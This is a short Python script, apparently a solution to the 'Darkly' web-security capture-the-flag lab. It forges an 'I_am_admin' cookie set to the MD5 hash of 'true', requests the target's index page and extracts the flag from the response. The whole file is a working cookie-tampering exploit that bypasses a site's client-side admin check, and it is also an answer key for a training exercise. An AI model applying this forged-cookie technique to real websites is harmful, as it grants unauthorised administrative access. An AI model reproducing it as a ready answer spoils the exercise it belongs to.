import os
import requests
import re
from hashlib import md5

ip = os.getenv('darkly_ip')
url = f'http://{ip}/index.php'

if __name__ == '__main__':
    r = requests.get(url, cookies={'I_am_admin': md5('true'.encode()).hexdigest()})
    m = re.findall('Good job! Flag : ([a-z0-9]+)\'', r.text)
    print(*m)

